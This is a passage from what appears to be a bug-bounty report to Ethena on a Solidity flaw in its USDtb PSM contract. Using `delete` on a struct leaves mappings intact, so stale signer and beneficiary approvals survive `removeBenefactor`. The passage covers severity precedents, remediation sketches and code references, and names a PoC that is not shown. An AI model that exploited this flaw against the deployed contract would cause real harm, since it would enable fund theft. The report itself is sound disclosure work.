The "delete on a struct containing mappings silently leaves mapping entries intact" pattern is the subject of numerous findings in the public audit corpora of Trail of Bits, OpenZeppelin, and Consensys Diligence. The pattern's severity is determined by **what the persisted mapping controls**. When the persisted mapping controls **authorization** (as here: `delegatedSigners` and `approvedBeneficiaries`), the pattern is consistently classified at **High or Critical** depending on the assets reachable through the stale authorization. Ethena's case is on the Critical-impact end of the spectrum because the persisted authorization mapping directly controls a `safeTransferFrom` of the protocol's primary asset token (USDtb) to an attacker-chosen beneficiary.

### Pattern 2 — "Re-initialization missing on re-add / redeploy" (Immunefi-accepted, High to Critical)

Immunefi has repeatedly accepted reports where a contract that is "removed and re-added" (or "disabled and re-enabled," or "redeposited after withdrawal") fails to clear attacker-relevant state from the previous lifecycle. Public-record examples include:
- Vaults/strategies that retain stale strategist addresses after a strategist is removed (multiple Yearn-style reports).
- NFT / ERC-20 contracts that retain stale approvals after a burn-and-redeploy.
- OFT / cross-chain bridge contracts that retain stale message-passing authorizations after a configuration reset.

The common thread: the contract ships an administrative "reset" function that does not actually reset the security-relevant state. Ethena's `removeBenefactor` is squarely within this pattern. The accepted severity for this pattern, when the stale state permits fund movement, is **High** to **Critical**.

### Pattern 3 — "Silent persistence — no event on stale state" (aggravating factor)

A consistent aggravating factor in Immunefi's severity model is **silent persistence**: when the contract emits an event suggesting a clean removal (here: `BenefactorRemoved`) but does not emit any event indicating that mappings survived. The admin's only signal — the event log — actively misleads them. This pattern has been the basis for severity escalation in multiple accepted reports.

### Pattern 4 — "Incident-response function defeated" (Critical-leaning factor)

The most relevant precedent class is **bugs that defeat a protocol's own incident-response function**. Immunefi has historically weighted these toward Critical because the protocol's ability to **recover** from a compromise is itself a security-critical property. A bug that turns the incident-response lever into a no-op is not merely a fund-theft bug — it is a **resilience bug** that erodes the protocol's defense-in-depth. Ethena's `removeBenefactor` is precisely such a function, and the bug is precisely such a defeat.

### Pattern 5 — OpenZeppelin `AccessControl` comparison is inapplicable

A likely defense will compare `removeBenefactor` to OpenZeppelin's `AccessControl.revokeRole` (which also does not clear application-level state when revoking a role). This comparison is inapplicable: OZ's `revokeRole` does not use `delete` on a struct — it sets a single boolean (`_roles[role].members[account] = false`). OZ does not **claim** to clear state and does not **imply** permanent cleanup via `delete`. Ethena's `removeBenefactor` does use `delete` on a struct — implying permanent cleanup — and the cleanup silently fails for six mappings. The intent divergence (vs `disableBenefactor`, which does not use `delete`) is what makes Ethena's case a defect rather than a documented single-field operation.

## Remediation

Three remediation options, in increasing order of structural change. We recommend **Option B**.

### Option A — Explicitly clear nested mappings in `removeBenefactor`

```solidity
// Sketch — NOT recommended
function removeBenefactor(address benefactor) external ... {
    if (!benefactorState[benefactor].config.isActive) revert BenefactorNotActive(benefactor);
    // Problem: cannot iterate mapping keys in Solidity without an auxiliary enumerable set.
    // Would require adding an EnumerableSet<Address> for delegatedSigners, approvedBeneficiaries,
    // swapForAssetFeeByCollateral, swapForCollateralFeeByCollateral, zeroSwapForAssetFeeExemptions,
    // zeroSwapForCollateralFeeExemptions — significant storage and gas overhead per add/remove.
    delete benefactorState[benefactor].config;
    emit BenefactorRemoved(benefactor);
}
```

**Trade-offs:** Conceptually simplest, but impractical. Mappings cannot be iterated in Solidity without an auxiliary enumerable key set. Adding enumerable sets for all six mappings would significantly increase gas on every `setDelegatedSigner`, `setApprovedBeneficiary`, and fee-config call. Not recommended.

### Option B — `configVersion` counter (RECOMMENDED)

Add a `uint96 configVersion` field to `BenefactorConfig`. Increment it on `removeBenefactor`. Store `delegatedSigners` and `approvedBeneficiaries` (and ideally the four fee-related mappings) under a versioned key: `mapping(uint96 => mapping(address => DelegatedSignerStatus)) delegatedSignersByVersion`. In `_validateBenefactor`, read with the current `configVersion`. All old entries become unreachable after removal.

```solidity
// Sketch
struct BenefactorConfig {
    bool isActive;
    uint96 configVersion;   // <- NEW
    uint128 maxSwapForAssetPerEpoch;
    // ...
    mapping(uint96 => mapping(address => DelegatedSignerStatus)) delegatedSignersByVersion;
    mapping(uint96 => mapping(address => bool)) approvedBeneficiariesByVersion;
    // ...
}

function removeBenefactor(address b) external ... {
    if (!benefactorState[b].config.isActive) revert BenefactorNotActive(b);
    benefactorState[b].config.configVersion++;           // <- invalidate all old entries
    delete benefactorState[b].config;                    // still safe; value types reset
    emit BenefactorRemoved(b);
}

function _validateBenefactor(Order calldata o, BenefactorState storage s) internal view {
    uint96 v = s.config.configVersion;
    // ...
    if (msg.sender != o.benefactor
        && s.config.delegatedSignersByVersion[v][msg.sender] != DelegatedSignerStatus.ACCEPTED) revert ...;
    if (o.benefactor != o.beneficiary
        && !s.config.approvedBeneficiariesByVersion[v][o.beneficiary]) revert ...;
}
```

**Trade-offs:** Architecturally clean. One extra SLOAD per validation. Makes the "permanent cleanup" intent of `removeBenefactor` actually hold. Old mapping storage is left unreferenced (effectively garbage-collected at the storage slot level — no gas refund, but no ongoing cost either). Recommended. Note: this is a state-machine change requiring migration logic for any existing benefactors.

### Option C — `wasEverAdded` blocklist + require fresh address on re-add

```solidity
// Sketch
mapping(address => bool) private wasEverAdded;

function addBenefactor(address b) external ... {
    if (wasEverAdded[b]) revert BenefactorAddressPreviouslyUsed(b);
    if (benefactorState[b].config.isActive) revert BenefactorAlreadyExists(b);
    // ...
    wasEverAdded[b] = true;
    benefactorState[b].config.isActive = true;
    emit BenefactorAdded(b);
}
```

**Trade-offs:** Simplest fix that prevents the exploit (re-add at the same address is blocked). Forces the operational workaround (fresh address) at the contract level — eliminates the bug by eliminating the precondition. Trade-off: legitimate re-onboarding at the same address (e.g., a non-compromised benefactor who was temporarily removed for operational reasons) now requires deploying a new address, which is the operational friction the remove/add API was meant to avoid. Less elegant than Option B, but acceptable as a near-term mitigation while Option B is being designed.

### Recommended deployment sequence

1. **Immediate:** Add Option C as a hotfix (low risk, prevents exploit, no migration).
2. **Next release:** Implement Option B (proper structural fix) and remove the Option C blocklist (or keep it as defense-in-depth).
3. **Communication:** Notify all benefactors who were previously removed and re-added that their old delegated-signer and beneficiary approvals may have persisted, and recommend they call `removeDelegatedSigner` and `setApprovedBeneficiary(false)` for any address they no longer wish to authorize.

## References

- **Solidity language spec, `delete` operator:** https://docs.soliditylang.org/en/latest/types.html#delete — *"delete a has no effect on mappings ... assignments to structs ... delete applied to a struct resets all members that are not mappings."* This is the language working as designed; the bug is that the contract relies on `delete` to perform a cleanup that `delete` provably does not perform.
- **`contracts/PSM.sol` L611–615:** `disableBenefactor` — sets `isActive = false`, does NOT use `delete` (intent: temporary pause, mappings persist by design).
- **`contracts/PSM.sol` L617–636:** `addBenefactor` — only sets `isActive = true`; no re-initialization, no version counter.
- **`contracts/PSM.sol` L638–649:** `removeBenefactor` — uses `delete benefactorState[benefactor].config` (L647), which is a no-op on the six nested mappings in `BenefactorConfig`. **This is the bug.**
- **`contracts/PSM.sol` L268–336:** `swap` — the `swapForAsset` branch at L325–328 pulls collateral from `order.benefactor` and sends asset (USDtb) to `order.beneficiary`.
- **`contracts/PSM.sol` L849–853:** `setDelegatedSigner` — sets `delegatedSigners[signer] = PENDING`. Callable by the benefactor.
- **`contracts/PSM.sol` L868–876:** `confirmDelegatedSigner` — sets `delegatedSigners[msg.sender] = ACCEPTED`. Requires `isActive` at confirmation time, but no re-confirmation is required on re-add.
- **`contracts/PSM.sol` L887–894:** `removeDelegatedSigner` — sets `delegatedSigners[signer] = REJECTED`. Only callable by the benefactor (`msg.sender`), not by the admin — so the admin cannot clean up stale delegations on behalf of a compromised benefactor.
- **`contracts/PSM.sol` L906–921:** `setApprovedBeneficiary` — sets `approvedBeneficiaries[beneficiary] = approved`. Callable by the benefactor.
- **`contracts/PSM.sol` L1493–1506:** `_validateBenefactor` — the authorization gate. Reads `delegatedSigners[msg.sender]` (L1498) and `approvedBeneficiaries[order.beneficiary]` (L1502) directly with no version/epoch/nonce-of-creation binding.
- **`contracts/deps/IPSM.sol` L112–124:** `BenefactorConfig` struct definition — six nested mappings including `delegatedSigners` (L118) and `approvedBeneficiaries` (L119).
- **`contracts/deps/IPSM.sol` L150–155:** `BenefactorState` struct definition — wraps `BenefactorConfig config` plus three more mappings (`epochStateByDuration`, `periodStateByDuration`, `orderNonceInvalidator`).
- **`protocol-research/ethena.md` L45–49:** Ethena Critical-tier impacts — "Direct theft of user funds (at-rest or in-motion, excluding unclaimed yield)."
- **`protocol-research/ethena.md` L51–56:** Ethena High-tier impacts — "Temporary freezing of funds."
- **`protocol-research/ethena.md` L63–74:** Ethena out-of-scope list — including "Attacks requiring leaked keys/credentials" and "Attacks requiring privileged addresses (governance/strategist) without modifications." Addressed in §9 (Defense Anticipation).
- **Contract address (Ethereum mainnet):** `0x73E35C5c35A274E34AdE6EB13cC7f62aEE323728` (USDtb PSM).
- **Foundry PoC:** `vuln/PoC_removeBenefactor.t.sol` — 4 tests, all pass against the unmodified `contracts/PSM.sol`.

## Acknowledgments

Discovered via test-coverage-gap analysis. PSM.sol is 2,083 lines of code and has zero test files in the canonical repo. The bug would have been caught by a single storage-assertion test that asserts `delegatedSigners[X]` and `approvedBeneficiaries[Y]` are reset after `removeBenefactor`. No such test exists. The absence of a NatSpec note on `removeBenefactor` stating "does not clear mappings" — combined with the deliberate code divergence from `disableBenefactor` (which does not use `delete`) — works against any defense that the persistence was intentional.

---

*End of submission.*
